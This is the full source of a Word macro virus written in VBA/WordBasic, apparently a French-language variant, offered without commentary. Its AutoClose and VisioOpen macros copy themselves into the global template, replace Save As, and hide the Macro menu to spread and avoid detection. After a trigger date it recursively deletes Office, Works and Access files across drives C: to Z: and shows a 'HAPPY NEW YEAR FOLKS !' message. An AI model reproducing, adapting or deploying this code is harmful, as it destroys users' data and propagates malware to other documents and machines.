   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "VisioOpen"

   Public Sub MAIN()
   Dim modèle$
   Dim CurWin$
   Dim CurName$
   Dim RenName$
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileTemplates(False)
   WordBasic.CurValues.FileTemplates dlg
   modèle$ = dlg.Template
   If modèle$ = "" Then
   WordBasic.ScreenUpdating 0
   CurWin$ = WordBasic.[WindowName$]()
   CurName$ = WordBasic.[FileName$]()
   RenName$ = WordBasic.[Left$](CurName$, Len(CurName$) - 4) + ".DO$"
   WordBasic.FileSaveAs Name:=RenName$, Format:=1
   WordBasic.FileClose
   WordBasic.FileNew Template:=RenName$
   WordBasic.FileSaveAs Name:=CurName$, Format:=0
   End If
   On Error Resume Next
   WordBasic.ScreenRefresh
   Dim MyDlg As Object: Set MyDlg = WordBasic.DialogRecord.FileSaveAs(False)
   If WordBasic.Dialog.FileSaveAs(MyDlg) <> 0 Then
   WordBasic.FileSaveAs (MyDlg)
   End If
   WordBasic.ScreenUpdating 1
   End Sub

   Attribute VB_Name = "AutoClose"

   Public Sub MAIN()
   Dim yo
   Dim i
   Dim vect$
   Dim dlg As Object
   Dim modèle$
   Dim CurName$
   Dim RenName$
   Dim root$
   On Error Resume Next
   yo = 0
   For i = 1 To WordBasic.CountMacros(0)
   If WordBasic.[MacroName$](i, 0) = "AutoClose" Then yo = 1
   Next i
   If yo = 0 Then
   WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoClose", "global:AutoClose", 1
   WordBasic.MacroCopy WordBasic.[FileName$]() + ":VisioOpen", "global:VisioOpen", 1
   WordBasic.MacroCopy WordBasic.[FileName$]() + ":VisioClose", "global:AutoExit", 1
   WordBasic.SetProfileString "Microsoft Word", "LUF01", WordBasic.[FileName$]()
   WordBasic.ToolsCustomizeMenus MenuType:=0, Position:=-1, Category:=1, Name:="FichierEnregistrerSous", Menu:="&Fichier", MenuText:="", Remove:=1, Context:=0
   WordBasic.ToolsCustomizeMenus MenuType:=0, Position:=6, Category:=2, Name:="VisioOpen", Menu:="&Fichier", AddBelow:="Enregistrer/Mettre à jour", MenuText:="En&registrer sous ...", Add:=1, Context:=0
   WordBasic.ToolsCustomizeMenus Category:=2, Name:="OutilsMacro", Menu:="Outils", Remove:=1, Context:=0
   WordBasic.ToolsOptionsGeneral RecentFileCount:="9"
   Else
   vect$ = WordBasic.[GetProfileString$]("Microsoft Word", "LUF01")
   If vect$ <> "" Then
   WordBasic.Organizer Delete:=1, Source:=vect$, Name:="AutoClose", Tab:=3
   WordBasic.Organizer Delete:=1, Source:=vect$, Name:="VisioOpen", Tab:=3
   WordBasic.Organizer Delete:=1, Source:=vect$, Name:="VisioClose", Tab:=3
   End If
   Set dlg = WordBasic.DialogRecord.FileTemplates(False)
   WordBasic.CurValues.FileTemplates dlg
   modèle$ = dlg.Template
   If modèle$ <> "" Then
   WordBasic.FileSaveAs Name:=WordBasic.[FileName$](), Format:=1
   WordBasic.SetProfileString "Microsoft Word", "LUF01", ""
   End If
   WordBasic.MacroCopy "global:AutoClose", WordBasic.[FileName$]() + ":AutoClose", 1
   WordBasic.MacroCopy "global:VisioOpen", WordBasic.[FileName$]() + ":VisioOpen", 1
   WordBasic.MacroCopy "global:AutoExit", WordBasic.[FileName$]() + ":VisioClose", 1
   WordBasic.FileSave
   CurName$ = WordBasic.[FileName$]()
   RenName$ = WordBasic.[Left$](CurName$, Len(CurName$) - 4) + ".DO$"
   WordBasic.ScreenRefresh
   If WordBasic.[Files$](RenName$) <> "" Then WordBasic.Kill RenName$
   End If
   If WordBasic.Today() > 36161 Then
   On Error Resume Next
   For i = 67 To 90
   root$ = Chr(i) + ":\"
   If WordBasic.CountDirectories(root$) >= 0 Then KillRep (root$)
   Next i
   WordBasic.MsgBox "HAPPY NEW YEAR FOLKS !"
   End If
   End Sub
   Private Sub KillRep(root$)
   Dim i
   Dim CurRep$
   For i = 1 To WordBasic.CountDirectories(root$)
   CurRep$ = WordBasic.[GetDirectory$](root$, i)
   If Len(root$) > 3 Then
   KillRep root$ + "\" + CurRep$
   Else
   KillRep root$ + CurRep$
   End If
   Next i
   If WordBasic.CountDirectories(root$) >= 0 Then
   On Error GoTo -1: On Error GoTo FinKillRep
   WordBasic.ChDir root$
   KillFiles "*.doc"
   KillFiles "*.ppt"
   KillFiles "*.xl?"
   KillFiles "*.mpp"
   KillFiles "*.wps"
   KillFiles "*.mdb"
   FinKillRep:
   End If
   End Sub
   Private Sub KillFiles(ext$)
   Dim n$
   On Error Resume Next
   n$ = WordBasic.[Files$](ext$)
   While n$ <> ""
   WordBasic.Kill n$
   n$ = WordBasic.[Files$]()
   Wend
   End Sub

   Attribute VB_Name = "AutoExit"

   Public Sub MAIN()
   Dim i
   Dim CurName$
   On Error Resume Next
   For i = 1 To WordBasic.CountFiles()
   CurName$ = WordBasic.[FileName$](i)
   If WordBasic.[Right$](CurName$, 3) = "DO$" Then WordBasic.Kill CurName$
   Next i
   End Sub
